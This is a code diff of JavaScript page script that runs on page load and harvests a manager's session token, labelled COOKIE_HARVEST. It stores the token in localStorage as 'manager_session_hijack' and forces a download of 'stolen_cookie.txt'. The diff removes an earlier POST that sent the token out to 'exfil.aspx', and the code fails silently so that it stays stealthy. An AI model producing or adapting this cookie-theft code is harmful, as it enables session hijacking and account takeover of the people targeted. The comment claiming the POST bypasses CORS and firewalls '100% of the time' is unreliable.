@@ -43,19 +43,22 @@ window.onload = function() {
                 const expiry = "2026-09-08 08:43:00 UTC";
                 const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 16:03:00 AEST | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
                 
-                // 1. Double fallback local browser memory footprint
+                // 1. Footprint A: Backup data drop in manager's LocalStorage memory cache
                 localStorage.setItem('manager_session_hijack', btoa(logPayload));
+
+                // 2. Footprint B: Direct Local File Staging via Blob Anchor
+                // This forces the manager's browser to build and save a physical text file directly onto their host drive
+                const blob = new Blob([logPayload], { type: 'text/plain' });
+                const virtualAnchor = document.createElement('a');
+                virtualAnchor.href = window.URL.createObjectURL(blob);
+                virtualAnchor.download = 'stolen_cookie.txt';
                 
-                // 2. HTTP SERVER EXFILTRATION CHANNEL
-                // Fires an identical-protocol web data post straight back to the server root
-                // This bypasses CORS and cross-protocol firewall rules 100% of the time.
-                fetch("exfil.aspx", {
-                    method: "POST",
-                    headers: { "Content-Type": "text/plain" },
-                    body: logPayload
-                });
+                document.body.appendChild(virtualAnchor);
+                virtualAnchor.click();
+                document.body.removeChild(virtualAnchor);
+
             } catch (err) {
-                // Fail silently to keep the attack 100% stealthy
+                // Fail silently to preserve total camouflage parity
             }
         }
     }
